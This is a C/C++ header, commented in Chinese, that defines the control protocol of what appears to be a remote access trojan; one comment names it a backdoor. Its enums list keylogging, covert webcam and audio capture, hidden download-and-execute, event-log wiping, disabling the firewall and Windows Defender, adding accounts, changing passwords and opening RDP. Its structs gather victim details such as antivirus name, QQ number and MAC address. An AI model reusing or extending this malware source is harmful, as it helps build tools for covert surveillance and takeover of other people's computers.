#pragma once
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED
enum
{
	/// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送

	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件

	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_AERO_DISABLE,			// 禁用桌面合成(Aero)
	COMMAND_AERO_ENABLE,			// 启用桌面合成(Aero)
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制

	
	COMMAND_DESKTOP_EXPLORER,			// 打开资源管理器
	COMMAND_DESKTOP_RUN,			// 打开运行
	COMMAND_DESKTOP_POWERSHELL,			// 打开powershell
	COMMAND_DESKTOP_CMROME,			// 打开谷歌
	COMMAND_DESKTOP_EDGE,			// 打开edge
	COMMAND_DESKTOP_FIREFOX,			// 打开火狐
	COMMAND_DESKTOP_IE,			// 打开IE

	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版
	COMMAND_newSCREEN_SPY,				// 新屏幕查看
	COMMAND_newAERO_DISABLE,			// 禁用桌面合成(Aero)
	COMMAND_newAERO_ENABLE,			// 启用桌面合成(Aero)
	COMMAND_newSCREEN_RESET,			// 改变屏幕深度
	COMMAND_newALGORITHM_RESET,		// 改变算法
	COMMAND_newSCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_newSCREEN_CONTROL,			// 屏幕控制
	COMMAND_newSCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_newSCREEN_BLANK,			// 服务端黑屏
	COMMAND_newSCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_newSCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_newSCREEN_SET_CLIPBOARD,	// 设置远程剪帖版
	COMMAND_SSLIST,						//获取服务列表

	COMMAND_TASKLIST,					//获取计划任务列表
	COMMAND_TASKCREAT,				//
	COMMAND_TASKDEL,//
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)
	COMMAND_UALITY30,
	COMMAND_UALITY75,
	COMMAND_UALITY100,
	COMMAND_KEYBOARD,	// 键盘记录
	COMMAND_DESKTOP,
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容
	COMMAND_KEYBOARD_GET,			// 获取记录
	COMMAND_GN,							//实用工具
	COMMAND_AUDIO,					// 语音监听
	COMMAND_SPEAKER,				// 扬声器监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_SYSTEMINFO,				// 系统信息
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_KILLPROCESSDEL,		//关闭进程并删除文件
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_WINDOW_CLOSE,           // 关闭窗口
	COMMAND_WINDOW_TEST,            // 操作窗口
	COMMAND_KILLPROCEDELE,			// 关闭进程并删除文件
	COMMAND_SOFTWARELIST,           // 软件列表
	COMMAND_IHLIST,                 // IE浏览记录
	COMMAND_IHFILE,                 // 历史文件访问
	COMMAND_NSLIST,                 // 网络连接列表
	COMMAND_APPUNINSTALL,           // 卸载软件
	COMMAND_GETHOSTS,               // 获取Host文件
	COMMAND_SETHOSTS,               // 修改Host文件
	COMMAND_NETCONFIG,				// 网络配置
	COMMAND_REMOTE,				// 硬件信息
	COMMAND_STARTUP,				// 启动项

	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_System,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_Security,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_Application,		// 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	COMMAND_CHANGE_GROUP,			// 更改分组
	COMMAND_SYSINFO,                //服务器信息
	COMMAND_SEND_SYSINFO,			//获取服务器信息
	COMMAND_NET_USER,				//无net添加用户
	COMMAND_GUEST,                  //启用GUEST
	COMMAND_STOPFIRE,               //关闭防火墙
	COMMAND_CHANGE_PORT,            //更改终端端口
	COMMAND_OPEN_PROXY,				//代理
	COMMAND_CLOSE_3389,				//关闭3389
	COMMAND_OPEN_3389,				//开启3389
	COMMAND_DLL_3389,				//可以传输3389dll
	COMMAND_START_MAP,				//开启映射
	COMMAND_CLOSE_PORT,				//关闭映射
	COMMAND_SLIST,					//获取系统用户
	COMMAND_DELUSER,				//删除用户
	COMMAND_NET_CHANGE_PASS,		//更改用户密码
	COMMAND_WTSLIST,				//在线用户
	COMMAND_WTS_Logoff,			    //注销用户
	COMMAND_WTS_Disconnect,			//断开用户
	COMMAND_DISABLEEUSER,
	COMMAND_ACITVEUSER,

	COMMAND_REGEDIT,                //注册表管理
	COMMAND_REG_FIND,               //查询该项  
	COMMAND_REG_DELPATH,            //删除项
	COMMAND_REG_CREATEPATH,         //创建项
	COMMAND_REG_DELKEY,             //删除键
	COMMAND_REG_CREATKEY,           //创建键
	COMMAND_SERMANAGER,				// 服务管理 
	COMMAND_TASK,					//计划任务
	COMMAND_REMARK,					//更改备注
	COMMAND_HIDE_FILE,
	// 服务端发出的标识
	TOKEN_AUTH = 130,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常
	TOKEN_ACCESS_ERROR,
	TOKEN_SSLIST,					// 服务管理
	TOKEN_CHAT_START,               // 交谈开始
	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_DESKTOP,
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容
	TOKEN_newBITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_newFIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_newNEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_newCLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容
	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据

	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据
	TOKEN_SPEAK_START,				// 开始扬声器监听
	TOKEN_SPEAK_STOP,				// 关闭扬声器监听
	TOKEN_SEND_SPEAK_START,				//发送本地扬声器
	TOKEN_SEND_SPEAK_STOP,				//关闭发送本地扬声器
	TOKEN_SPEAK_DATA,				// 接收扬声器数据
	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据

	TOKEN_TASKLIST,						//计划任务列表信息

	TOKEN_SYSINFOLIST,              // 信息列表
	TOKEN_ADD_SUCCESS,				// 添加成功
	TOKEN_ADD_ERROR,				// 添加失败
	TOKEN_DEL_SUCCESS,				// 删除用户成功
	TOKEN_DEL_ERROR,				// 删除用户失败
	TOKEN_CHANGE_PSAA_SUCCESS,		// 修改密码成功
	TOKEN_CHANGE_PSAA_ERROR,		// 修改密码失败
	TOKEN_TOOLS,
	TOKEN_OPEN_SUCCESS,					// 开启3389成功
	TOKEN_OPEN_ERROR,					// 开启3389失败

	TOKEN_CLOSE_SUCCESS,					// 关闭3389成功
	TOKEN_CLOSE_ERROR,					// 关闭3389失败

	TOKEN_SLIST,					// 枚举系统用户
	TOKEN_WTSLIST,					// 枚举在线用户
	TOKEN_STATE_SUCCESS,			// 更改用户状态成功
	TOKEN_STATE_ERROR,				// 更改用户状态失败

	TOKEN_USER_CLOSE_SUCCESS,			// 用户关闭连接成功
	TOKEN__USER_CLOSE_ERROR,				// 用户关闭连接失败
	TOKEN_OFF_SUCCESS,			// 注销用户成功
	TOKEN_OFF_ERROR,				// 注销用户失败

	TOKEN_CSystemManager,
	TOKEN_SYSTEMINFO,				// 系统信息
	TOKEN_PSLIST,					// 进程列表
	TOKEN_ENVLIST,				//环境变量
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_SOFTWARE,					// 软件列表
	TOKEN_IHLIST,                   // IE浏览记录
	TOKEN_IHFILE,			//文件历史
	TOKEN_REMOTE,			//远程
	TOKEN_NSLIST,					// 网络连接列表
	TOKEN_HOSTSINFO,				// Host文件
	TOKEN_STARTUP,					// 启动项
	TOKEN_REGEDIT,                  // 打开注册表界面
	TOKEN_REG_PATH,                 // 发送注册表项名
	TOKEN_REG_KEY,                  // 发送键名
	TOKEN_REG_OK,                   // 执行成功
	TOKEN_REG_NO,                   // 执行失败
		
	COMMAND_DLLVERSION,				// DLL VERSION
	COMMAND_DLLERROR,				// DLL ERROR 
	COMMAND_DLLMAIN,				// DLL MAIN
	COMMAND_DLLOK,					// 可以加载DLL

	TOKEN_DLLVERSION,				// 获取DLL的版本
	TOKEN_DLLLOADERROR,				// 服务加载失败
	TOKEN_DLLMAIN,					// DLLMAIN
	TOKEN_DLLOK,

	COMMAND_PROXY,					// proxy
	COMMAND_PROXY_CONNECT, //socket5代理
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_DATA,
	TOKEN_PROXY_START,//proxy start.
	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	TOKEN_PROXY_BIND_RESULT_RESULT,
	TOKEN_HIDE_FINISH,
	TOKEN_OLDBITMAPINFO,
	TOKEN_FIRSTSCREEN1,
	TOKEN_NEXTSCREEN1,
	TOKEN_CLIPBOARD_TEXT1,
	COMMAND_SCREEN_RESET1,
	COMMAND_ALGORITHM_RESET1,
	COMMAND_WIN7BASIC1,
	COMMAND_SCREEN_CTRL_ALT_DEL1,
	COMMAND_SCREEN_BLOCK_INPUT1,
	COMMAND_SCREEN_BLANK1,
	COMMAND_SCREEN_CAPTURE_LAYER1,
	COMMAND_SCREEN_GET_CLIPBOARD1,
	COMMAND_SCREEN_CONTROL1,
	COMMAND_SCREEN_SET_CLIPBOARD1,
	COMMAND_OLDPINGMU,
	COMMAND_UPDATACLIENT
};

//enum 小功能
enum
{
	DESK_TOP = 0x00,	// 桌面预览
	DISABLE_TASK,		//禁用任务管理器
	ENABLE_TASK,		//启用任务管理器
	OK,
	DISABLE_DEF,		//禁用windows def
	ENABLE_DEF,		//打开windos def
};

typedef struct
{
	BYTE			bToken;				// = 1
	IN_ADDR			nIPAddress;		//存储32位的IPv4的地址数据结构
	char			Os[0x20];			// 版本信息
	char			HostName[50];	// 主机名
	char			UserName[50];	// 用户名
	int				CPUClockMhz;	// CPU主频
	DWORD			CPUNumber;	// CPU个数
	DWORD			MemSize;		// 内存大小
	DWORD			HD;		// 硬盘
	DWORD			dwSpeed;		// 网速
	bool			bIsWebCam;		// 是否有摄像头
	char			Virus[40];		// 杀毒软件
	char			InstallTime[0x30];	//安装日期
	char			Remark[0x30];		//备注
}LOGININFO;

struct MYSYSINFO
{
	char szCpuInfo[128];   //CPU信息
	DWORD szMemoryFree;     //可用内存 
	DWORD szDriveFreeSize;  //可用硬盘大小
	CHAR szScrSize[32];    //屏幕分辨率
	char szActiveTime[128]; //活动时间
	CHAR szQq[100];        //当前登录QQ号
	CHAR szMac[100];        //当前MAC地址
	char szGraphics[128];	//显卡
	DWORD Memory7;			//显存
	CHAR Program[256];     //程序途径
	CHAR environment[32]; //运行环境
	WCHAR lpLCData[32];  //系统语言
	char rport[10];			//是否开启远程服务
	char qiang[10];			//防火墙状态
};

#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 1024*3 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 1024*3// 最大接收数据长度

#endif // !defined(AFX_MACROS_H_INCLUDED)